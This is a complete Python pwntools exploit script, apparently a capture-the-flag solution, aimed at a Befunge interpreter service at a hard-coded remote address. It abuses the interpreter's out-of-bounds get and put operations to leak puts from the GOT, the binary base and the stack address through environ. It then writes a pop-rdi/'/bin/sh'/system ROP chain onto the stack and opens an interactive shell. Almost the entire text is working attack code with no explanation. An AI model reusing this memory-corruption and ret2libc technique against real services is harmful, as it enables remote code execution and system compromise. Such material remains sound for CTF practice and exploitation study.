from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
# io = process(['./pwn'])
io = remote('61.147.171.105', 53826)

stack_addr = 0x202040
elf_addr = 0x202008
puts_got = 0x201F50

program = b'&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&g,&&&*&+g,>>>>>>>v'\
		  b'&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&&*&+p&&&&*&+p>>>>>>v>'\
		  b'&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p>>>>>>>>>>>>>v>>'\
		  b'&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p>>>>>>>>>>>>v>>>'\
		  b'&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p>>>>>>>>>>>>>>>>>>>>>>>>>>>v>>>>'\
		  b'>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>v'\
		  b'>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>^<'.ljust(80*25, b'\x00')

for i in range(25):
	io.sendlineafter(b'> ', program[i*80:(i+1)*80])

puts_addr = 0
for i in range(8):
	io.sendline(str((puts_got - stack_addr) % 80 + i).encode())
	io.sendline(str((puts_got - stack_addr) // 80).encode())
	onebyte = u8(io.recv(1))
	puts_addr += onebyte << (8 * i);

print('\033[1;31m' + 'puts address = ' + hex(puts_addr) + '\033[0m')

libc = LibcSearcher('puts', puts_addr)
base = puts_addr - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
environ = base + libc.dump('environ')

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# base = puts_addr - libc.symbols['puts']
# system = base + libc.symbols['system']
# binsh = base + next(libc.search(b'/bin/sh'))
# environ = base + libc.symbols['environ']

elf_base = 0
for i in range(8):
	io.sendline(str((elf_addr - stack_addr) % 80 + i).encode())
	io.sendline(str((elf_addr - stack_addr) // 80).encode())
	onebyte = u8(io.recv(1))
	elf_base += onebyte << (8 * i);
elf_base -= elf_addr
print('\033[1;31m' + "elf base = " + hex(elf_base) + '\033[0m')

y = (environ - elf_base - stack_addr) % 80
x = (environ - elf_base - stack_addr) // 80
x1 = x % 0x100000
x2 = x // 0x100000

print('\033[1;31m' + 'y = ' + hex(y) + '\033[0m')
print('\033[1;31m' + 'x = ' + hex(x) + '\033[0m')
print('\033[1;31m' + 'environ = ' + hex(environ) + '\033[0m')

realstack = 0
for i in range(8):
	io.sendline(str(y + i).encode())
	io.sendline(str(x2).encode())
	io.sendline(str(0x100000).encode())
	io.sendline(str(x1).encode())
	realstack += u8(io.recv(1)) << (i * 8)

print('\033[1;31m' + "real stack address = " + hex(realstack) + '\033[0m')
write_ptr = realstack - 0xf0

# write 'pop rdi ; ret'
y = (write_ptr - elf_base - stack_addr) % 80
x = (write_ptr - elf_base - stack_addr) // 80
x1 = x % 0x100000
x2 = x // 0x100000
write_content = 0x120c + elf_base	# pop rdi ; ret

for i in range(8):
	io.sendline(str((write_content >> (8 * i)) & 0xFF))
	io.sendline(str(y + i).encode())
	io.sendline(str(x2).encode())
	io.sendline(str(0x100000).encode())
	io.sendline(str(x1).encode())

write_ptr += 8
# write address of /bin/sh
y = (write_ptr - elf_base - stack_addr) % 80
x = (write_ptr - elf_base - stack_addr) // 80
x1 = x % 0x100000
x2 = x // 0x100000
write_content = binsh

for i in range(8):
	io.sendline(str((write_content >> (8 * i)) & 0xFF))
	io.sendline(str(y + i).encode())
	io.sendline(str(x2).encode())
	io.sendline(str(0x100000).encode())
	io.sendline(str(x1).encode())

write_ptr += 8
# write address of system
y = (write_ptr - elf_base - stack_addr) % 80
x = (write_ptr - elf_base - stack_addr) // 80
x1 = x % 0x100000
x2 = x // 0x100000
write_content = system

# gdb.attach(io, 'b *$rebase(0x11FF)')
# time.sleep(3)

for i in range(8):
	io.sendline(str((write_content >> (8 * i)) & 0xFF))
	io.sendline(str(y + i).encode())
	io.sendline(str(x2).encode())
	io.sendline(str(0x100000).encode())
	io.sendline(str(x1).encode())

io.interactive()
